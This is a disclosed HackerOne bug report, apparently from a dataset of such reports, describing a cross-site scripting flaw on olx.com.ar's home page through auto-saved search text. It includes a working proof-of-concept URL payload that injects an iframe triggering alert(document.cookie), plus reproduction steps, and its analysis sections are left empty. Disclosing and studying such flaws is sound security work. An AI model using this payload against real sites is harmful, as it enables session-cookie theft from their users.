---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '151691'
original_report_id: '151691'
title: XSS on Home page olx.com.ar via auto save search text
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-16T09:03:51.364Z'
disclosed_at: '2016-10-15T06:37:23.270Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on Home page olx.com.ar via auto save search text

## Metadata

- HackerOne Report ID: 151691
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-10-15T06:37:23.270Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi guys,
I found XSS vulnerability on Home page olx.com.ar via auto save search text

1. Copy full link and go to the URL in browser:
>https://www.olx.com.ar/nf/search/xss%22-'%20%22%3E%3Ciframe/src%20////onload%20=%20alert(document.cookie)%20onerror=alert(document.cookie)

2. Click logo button go back to home page look play load xss

Sincerely,
Jeyhun Jafarov (c37hun)
Cybersecurity Specialist
c37hun@mail.ru

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
